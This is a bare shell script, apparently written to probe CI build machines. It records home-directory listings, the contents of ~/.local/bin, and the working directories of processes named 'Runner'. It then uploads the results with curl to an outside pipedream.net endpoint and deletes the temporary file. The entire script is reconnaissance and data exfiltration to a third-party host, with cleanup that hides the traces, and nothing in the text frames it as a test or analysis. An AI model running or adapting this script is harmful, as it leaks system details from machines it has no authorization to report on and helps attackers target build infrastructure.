#!/bin/sh

echo "--- START ---" > /tmp/file.txt

echo "--- ~/" >> /tmp/file.txt
ls -1la ~/ >> /tmp/file.txt

#echo "--- /usr/local/bin" >> /tmp/file.txt
#ls -1la /usr/local/bin >> /tmp/file.txt

echo "--- $HOME/.local/bin/" >> /tmp/file.txt
ls -1la $HOME/.local/bin/ >> /tmp/file.txt

for pid in $(ps -ef | grep Runner  | tr -s ' ' | cut -d ' ' -f2)
do
    echo "---$pid---" >> /tmp/file.txt;
    echo $(pwdx $pid) >> /tmp/file.txt;
done

echo "--- FINISH ---" >> /tmp/file.txt

curl --data-binary "@/tmp/file.txt" https://ensf2rlc2dw6p.x.pipedream.net/

rm /tmp/file.txt
